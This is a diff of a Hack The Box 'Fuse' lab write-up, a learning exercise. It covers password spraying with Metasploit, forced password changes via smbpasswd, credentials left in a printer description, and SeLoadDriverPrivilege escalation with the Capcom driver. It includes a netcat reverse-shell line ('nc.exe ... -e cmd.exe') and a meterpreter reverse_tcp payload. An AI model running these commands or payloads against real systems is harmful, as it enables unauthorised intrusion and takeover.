@@ -1,32 +1,30 @@
-http://fuse.fabricorp.local/papercut/logs/html/index.htm
+# HTB - Fuse
 
-# HTB - Machine_Name
+### Overview
 
-## Overview
-
-![](<machine>.infocard.png)
+![](../../.gitbook/assets/0-fuse-infocard.png)
 
 Short description to include any strange things to be dealt with
 
-You may see me using Metasploit more starting from this machine.  I recently went through a class where we used it extensively so I learned that it isn't as bad as I thought, and can even help workflow quite a bit in some cases.  I am probably still going to avoid easy-button exploits unless crunched for time (always depending on what is available!).  It's about the learning journey, not the end result of capturing the flags. 
+You may see me using Metasploit more starting from this machine. I recently went through a class where we used it quite a bit, so I learned that it isn't as bad as I thought and can even help workflow in some cases. I am probably still going to avoid easy-button exploits unless crunched for time \(always depending on what is available!\). It's about the learning journey, not the end result of capturing the flags.
 
-## Useful Skills and Tools
+### Useful Skills and Tools
 
-#### Useful thing 1
+**Useful thing 1**
 
-- description with generic example
+* description with generic example
 
-#### Useful thing 2
+**Useful thing 2**
 
-- description with generic example
+* description with generic example
 
-## Enumeration
+### Enumeration
 
-### Nmap scan
+#### Nmap scan
 
 I started my enumeration with an nmap scan of `10.10.10.193`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/fuse]
 └─$ nmap -n -v -p- -sCV -oA fuse 10.10.10.193    
 
@@ -98,31 +96,41 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 410.91 seconds
 ```
 
-many many ports open.  From the ports and services open this appears to be a domain controller running windows server 2012
+many many ports open. From the ports and services open this appears to be a domain controller running windows server 2016
 
-navigating to port 80 redirects to http://fuse.fabricorp.local/papercut/logs/html/index.htm, added fuse.fabricorp.local to hosts
+navigating to port 80 redirects to [http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm), added fuse.fabricorp.local to hosts
+
+![](../../.gitbook/assets/1-papercut.png)
+
+I clicked on view HTML for each of the print history pages
+
+![](../../.gitbook/assets/1-29may.png)
+
+![](../../.gitbook/assets/1-30may%20%281%29.png)
+
+![](../../.gitbook/assets/1-10jun.png)
 
 potential usernames in the print history pages
 
-```
-Time		User		Pages	Copies	Printer		Document						Client	Duplex	Grayscale
+```text
+Time        User        Pages    Copies    Printer        Document                        Client    Duplex    Grayscale
 Print Logs - 29 May 2020
-17:50:10 	pmerton 	1 	1 	HP-MFT01 	New Starter - bnielson - Notepad LETTER, 19kb, PCL6	JUMP01 	No 	Yes
-17:53:55 	tlavel 		1 	1 	HP-MFT01 	IT Budget Meeting Minutes - Notepad LETTER, 52kb, PCL6 	LONWK015 No 	Yes
+17:50:10     pmerton     1     1     HP-MFT01     New Starter - bnielson - Notepad LETTER, 19kb, PCL6    JUMP01     No     Yes
+17:53:55     tlavel         1     1     HP-MFT01     IT Budget Meeting Minutes - Notepad LETTER, 52kb, PCL6     LONWK015 No     Yes
 
 Print Logs - 30 May 2020
-16:37:45 	sthompson 	1 	1 	HP-MFT01 	backup_tapes - Notepad LETTER, 20kb, PCL6 	LONWK019 	No 	Yes
-16:42:19 	sthompson 	1 	1 	HP-MFT01 	mega_mountain_tape_request.pdf LETTER, 20kb, PCL6 	LONWK019 	No 	No
-17:07:06 	sthompson 	1 	1 	HP-MFT01 	Fabricorp01.docx - Word LETTER, 153kb, PCL6 	LONWK019 	No 	Yes
+16:37:45     sthompson     1     1     HP-MFT01     backup_tapes - Notepad LETTER, 20kb, PCL6     LONWK019     No     Yes
+16:42:19     sthompson     1     1     HP-MFT01     mega_mountain_tape_request.pdf LETTER, 20kb, PCL6     LONWK019     No     No
+17:07:06     sthompson     1     1     HP-MFT01     Fabricorp01.docx - Word LETTER, 153kb, PCL6     LONWK019     No     Yes
 
 Print Logs - 10 Jun 2020
-17:40:21 	bhult 		1 	1 	HP-MFT01 	offsite_dr_invocation - Notepad LETTER, 19kb, PCL6 	LAPTOP07 	No 	Yes
-19:18:17 	administrator 	1 	1 	HP-MFT01 	printing_issue_test - Notepad LETTER, 16kb, PCL6 	FUSE 	No 	Yes
+17:40:21     bhult         1     1     HP-MFT01     offsite_dr_invocation - Notepad LETTER, 19kb, PCL6     LAPTOP07     No     Yes
+19:18:17     administrator     1     1     HP-MFT01     printing_issue_test - Notepad LETTER, 16kb, PCL6     FUSE     No     Yes
 ```
 
-print logs
+I found six potential usernames \(including `bnielson` in one of the document titles. The document title `Fabricorp01.docx` also stuck out to me as looking like the perfect type of thing that corporate users would likely use as a password.  
 
-```
+```text
 msf5 auxiliary(gather/kerberos_enumusers) > run
 [*] Running module against 10.10.10.193
 
@@ -149,19 +157,18 @@ msf5 auxiliary(gather/kerberos_enumusers) > run
 [*] Auxiliary module execution complete
 ```
 
-unfortunately these users all have kerberos pre-authentication enabled
+Unfortunately these users all had Kerberos pre-authentication enabled, but I was able to confirm that all of them were valid usernames.
 
-https://www.papercut.com/kb/Main/RetrieveDeletedUserPrintData#restore-from-a-backup-on-to-a-test-server
+At first I started chasing the little white rabbit while doing research about this Papercut service.  I managed to find some interesting results that looked like a potential way to retrieve printed documents through backups, but I either did not have the proper privileges, or these options were not active on this site. 
 
-https://www.papercut.com/support/resources/manuals/ng-mf/common/topics/sys-backups.html
+* [https://www.papercut.com/kb/Main/RetrieveDeletedUserPrintData\#restore-from-a-backup-on-to-a-test-server](https://www.papercut.com/kb/Main/RetrieveDeletedUserPrintData#restore-from-a-backup-on-to-a-test-server)
+* [https://www.papercut.com/support/resources/manuals/ng-mf/common/topics/sys-backups.html](https://www.papercut.com/support/resources/manuals/ng-mf/common/topics/sys-backups.html)
+* \[app-path\]\server\data\backups
+* [https://nvd.nist.gov/vuln/detail/CVE-2019-8948](https://nvd.nist.gov/vuln/detail/CVE-2019-8948)
 
-[app-path]\server\data\backups
+After exhausting those possibilities, I went back and tried to do a good ol' brute force enumeration using the valid usernames I had found and my potential password I had spotted.
 
-https://nvd.nist.gov/vuln/detail/CVE-2019-8948
-
-looks like a potential password:
-
-```
+```text
 msf5 auxiliary(gather/kerberos_enumusers) > search type:auxiliary smb
 
 Matching Modules
@@ -226,9 +233,9 @@ msf5 auxiliary(scanner/smb/smb_login) > run
 [*] Auxiliary module execution completed
 ```
 
-Looks like not only one person has this as their password but 3 people do!
+After running the `smb_login` scanner I found that not only one person had used this as their password, but three people had!
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/fuse]
 └─$ smbclient -U "FABRICORP\bnielson" -L \\\\10.10.10.193\\
 Enter FABRICORP\bnielson's password: 
@@ -238,26 +245,22 @@ session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
 └─$ smbclient -U "FABRICORP\tlavel" -L \\\\10.10.10.193\\                                           1 ⨯
 Enter FABRICORP\tlavel's password: 
 session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
-                                                                                                        
+
 ┌──(zweilos㉿kalimaa)-[~/htb/fuse]
 └─$ smbclient -U "FABRICORP\bhult" -L \\\\10.10.10.193\\                                            1 ⨯
 Enter FABRICORP\bhult's password: 
 session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
 ```
 
-However I got an interesting error back when trying to enumerate open shares
+However, I got an interesting error back when trying to enumerate open shares for these three users: `NT_STATUS_PASSWORD_MUST_CHANGE`.  I looked this up and found out that this meant that the user's passwords had expired and would have to be changed before they could log in.  Next, I did some research on changing SMB login passwords remotely from a Linix command line.
 
-https://samba.samba.narkive.com/I0oDpMEz/smbclient-says-nt-status-password-must-change-how-to-change-password
+[https://samba.samba.narkive.com/I0oDpMEz/smbclient-says-nt-status-password-must-change-how-to-change-password](https://samba.samba.narkive.com/I0oDpMEz/smbclient-says-nt-status-password-must-change-how-to-change-password)
 
-> How does one go about changing the windows password from a unix machine
-with no physical access to the windows machine sharing things?
+> How does one go about changing the windows password from a unix machine with no physical access to the windows machine sharing things?
+>
+> SWAT provides the password change facility you are looking for. If you prefer a command line tool, smbpasswd has the same functionality - check the -U and -r options. The smbpasswd man page documents the password change options.
 
->SWAT provides the password change facility you are looking for. If you
-prefer a command line tool, smbpasswd has the same functionality - check
-the -U and -r options. The smbpasswd man page documents the password
-change options.
-
-```
+```text
 -r remote machine name
            This option allows a user to specify what machine they wish to change their password on.
            Without this parameter smbpasswd defaults to the local host. The remote machine name is
@@ -274,31 +277,35 @@ change options.
            read-only copy of the user account database and will not allow the password change).
 ```
 
-I checked the man page for `smbpasswd` to see what the `-r` and `-U` options did, and found out that this is how I could connect to a remote machine to change the user's passwords.
+I checked the man page for `smbpasswd` to see what the `-r` and `-U` options did, and found out that that these flags let me specify a remote host \(`-r`\) and username \(`U`\). 
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/fuse]
 └─$ smbpasswd -r 10.10.10.193 -U bnielson                                                           1 ⨯
-Old SMB password:
-New SMB password:
-Retype new SMB password:
+Old SMB password: Fabricorp01
+New SMB password: test
+Retype new SMB password: test
 machine 10.10.10.193 rejected the password change: Error was : When trying to update a password, this status indicates that some password update rule has been violated. For example, the password might not meet length criteria..
 ```
 
-There are some sort of password complexity rules in place
+I used this to try to change the password for `bnielson`, but it seemed as if there were some sort of password complexity rules in place. 
 
-```
+{% hint style="info" %}
+The passwords will not show up on the screen like in my output above.  I added them to illustrate what I had done since the two code output boxes were identical without them!
+{% endhint %}
+
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/fuse]
 └─$ smbpasswd -r 10.10.10.193 -U bnielson                                                         
-Old SMB password: 
-New SMB password: 
-Retype new SMB password: 
+Old SMB password: Fabricorp01
+New SMB password: $Up3rC0mp13xP@$$w0rd
+Retype new SMB password: $Up3rC0mp13xP@$$w0rd
 Password changed for user bnielson
 ```
 
-After choosing a (much!) more complex password, I was able to change it successfully
+After choosing a more complex password, I was able to change it successfully.
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/fuse]
 └─$ smbclient -U "bnielson" -L \\\\10.10.10.193\\ 
 Enter WORKGROUP\bnielson's password: 
@@ -315,9 +322,9 @@ Enter WORKGROUP\bnielson's password:
 SMB1 disabled -- no workgroup available
 ```
 
-Next I used my new passwword for `bnielson` to enumerate open SMB shares. Besides the defaults, there were also a `HP-MFT01` and a `$print` share.
+Next I used my new password for `bnielson` to enumerate open SMB shares. Besides the standard default shares, there were also a `HP-MFT01` and a `$print` share.
 
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/fuse]
 └─$ rpcclient -U bnielson 10.10.10.193   
 Enter WORKGROUP\bnielson's password: 
@@ -425,7 +432,7 @@ rpcclient $> querygroup 0x201
         Description:    All domain users
         Group Attribute:7
         Num Members:14
-		
+
 rpcclient $> queryusergroups
 Usage: queryusergroups rid [access mask]
 rpcclient $> enumdomgroups
@@ -450,7 +457,7 @@ group:[IT_Accounts] rid:[0x644]
 rpcclient $> querygroupmem 0x200
         rid:[0x1f4] attr:[0x7]
         rid:[0x641] attr:[0x7]
-		
+
 rpcclient $> queryuser 0x641
         User Name   :   sthompson
         Full Name   :
@@ -478,7 +485,7 @@ rpcclient $> queryuser 0x641
         logon_count:    0x00000001
         padding1[0..7]...
         logon_hrs[0..21]...
-		
+
 rpcclient $> queryuser 0x1f4
         User Name   :   Administrator
         Full Name   :
@@ -532,9 +539,9 @@ rpcclient $> enumprinters
         comment:[]
 ```
 
-After enumerating RPC with `rpcclient` for awhile and finding a bunch of useful information, I hit the jackpot when checking for printers.  In the description field someone had left a helpful note telling users where the printer was located, and also what the password was!
+After enumerating RPC with `rpcclient` for awhile and finding a bunch of useful information, I hit the jackpot when checking for printers. In the description field someone had left a helpful note telling users where the printer was located, and also what the password was!
 
-```
+```text
 msf5 auxiliary(scanner/smb/smb_login) > run
 
 [*] 10.10.10.193:445      - 10.10.10.193:445 - Starting SMB login bruteforce
@@ -592,20 +599,19 @@ msf5 auxiliary(scanner/smb/smb_login) > run
 
 Next I ran a brute force login attack against SMB after adding the new usernames and passwords to my lists.
 
-Hmm so both svc-print and svc-scan use the same password.  Hopefully one of them will allow me to get a shell.
+Hmm so both svc-print and svc-scan use the same password. Hopefully one of them will allow me to get a shell.
 
+### Initial Foothold
 
-## Initial Foothold
+### Road to User
 
-## Road to User
+#### Further enumeration
 
-### Further enumeration
+#### Finding user creds
 
-### Finding user creds
+I tried using the winrm enumeration module in metasploit, but it returned no valid logins. After playing around with different things for awhile, the colored text in ZSH saved me. I noticed that the `$` in the password were being interpreted by the terminal. Once I wrapped the password in single quotes I was able to login using evil-winrm.
 
-I tried using the winrm enumeration module in metasploit, but it returned no valid logins.  After playing around with different things for awhile, the colored text in ZSH saved me.  I noticed that the `$` in the password were being interpreted by the terminal.  Once I wrapped the password in single quotes I was able to login using evil-winrm.  
-
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/fuse]
 └─$ evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i 10.10.10.193 -P 5985                             
 
@@ -673,9 +679,9 @@ At line:1 char:1
 
 SeLoadDriverPrivilege sounded like a very interesting privilege to have...
 
-### User.txt
+#### User.txt
 
-```
+```text
 *Evil-WinRM* PS C:\users> tree /F C:\Users
 Folder PATH listing
 Volume serial number is E6C8-44FE
@@ -711,13 +717,13 @@ Mode                LastWriteTime         Length Name
 cea534708fb5e5dc92920ad8473e6553
 ```
 
-`tree` gave some odd looking output, but showed me that the `user.txt` proof was right there in my service account user's Desktop! (Why a service account has a Desktop I am not sure...)
+`tree` gave some odd looking output, but showed me that the `user.txt` proof was right there in my service account user's Desktop! \(Why a service account has a Desktop I am not sure...\)
 
-## Path to Power \(Gaining Administrator Access\)
+### Path to Power \(Gaining Administrator Access\)
 
-### Enumeration as User `svc-print`
+#### Enumeration as User `svc-print`
 
-```
+```text
 *Evil-WinRM* PS C:\users\svc-print\Desktop> get-process
 
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
@@ -772,8 +778,8 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 ```
 
 I checked running processes and didn't see anything too exciting.
-   
-```
+
+```text
 *Evil-WinRM* PS C:\users\svc-print\Desktop> services
 
 Path                                                                              Privileges Service                     
@@ -791,10 +797,9 @@ C:\Windows\servicing\TrustedInstaller.exe                                       
 "C:\Program Files\Windows Defender\MsMpEng.exe"                                         True WinDefend
 ```
 
-Same with running services.  I decided that since the service accound had the `SeLoadDriverPrivilege` privilege I would see if there were any published privilege excalation methods using it.  I quickly found one at https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/
+Same with running services. I decided that since the service accound had the `SeLoadDriverPrivilege` privilege I would see if there were any published privilege excalation methods using it. I quickly found one at [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
 
-
-```
+```text
 ┌──(zweilos㉿kalimaa)-[~/htb/fuse]
 └─$ evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i 10.10.10.193 -P 5985                             1 ⨯
 
@@ -805,7 +810,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc-print\Documents> upload print.exe
 Info: Uploading print.exe to C:\Users\svc-print\Documents\print.exe
 
-                                                             
+
 Data: 98400 bytes of 98400 bytes copied
 
 Info: Upload successful!
@@ -867,7 +872,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 *Evil-WinRM* PS C:\Users\svc-print\Documents> stop-process -name print
 ```
 
-```
+```text
 msf5 exploit(windows/local/capcom_sys_exec) > options
 
 Module options (exploit/windows/local/capcom_sys_exec):
@@ -891,7 +896,7 @@ Exploit target:
    Id  Name
    --  ----
    0   Windows x64 (<= 10)
-   
+
 msf5 exploit(windows/local/capcom_sys_exec) > set payload windows/x64/meterpreter/reverse_tcp
 payload => windows/x64/meterpreter/reverse_tcp
 msf5 exploit(windows/local/capcom_sys_exec) > exploit
@@ -900,10 +905,10 @@ msf5 exploit(windows/local/capcom_sys_exec) > exploit
 [-] Exploit aborted due to failure: not-vulnerable: Exploit not available on this system.
 [*] Exploit completed, but no session was created.
 ```
-   
+
 So much for trying to use metasploit for eveything on this machine!
 
-```
+```text
 meterpreter > sysinfo
 Computer        : FUSE
 OS              : Windows 2016+ (10.0 Build 14393).
@@ -916,22 +921,21 @@ Meterpreter     : x64/windows
 
 Windows x64
 
-### Getting a shell
+#### Getting a shell
 
 Searched more for how to exploit the SeLoadDriverPrivilege
 
-https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/
-https://github.com/tandasat/ExploitCapcom
+[https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/) [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
 
-have to compile the two files on Windows (matching x64 architecture), customise it a bit to have it call my .bat script
+have to compile the two files on Windows \(matching x64 architecture\), customise it a bit to have it call my .bat script
 
-```
+```text
 C:\Windows\Temp\nc.exe 10.10.15.74 55541 -e cmd.exe
 ```
 
 then the two compiled files
 
-```
+```text
 *Evil-WinRM* PS C:\temp> ./EOPLOADDRIVER.exe System\CurrentControlSet\printer C:\test\Capcom.sys
 [+] Enabling SeLoadDriverPrivilege
 [+] SeLoadDriverPrivilege Enabled
@@ -948,11 +952,9 @@ NTSTATUS: c000010e, WinError: 0
 [*] Press any key to exit this program
 ```
 
+#### Root.txt
 
-### Root.txt
-
-
-```
+```text
 msf5 exploit(multi/handler) > options
 
 Module options (exploit/multi/handler):
@@ -1066,3 +1068,4 @@ type root.txt
 Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
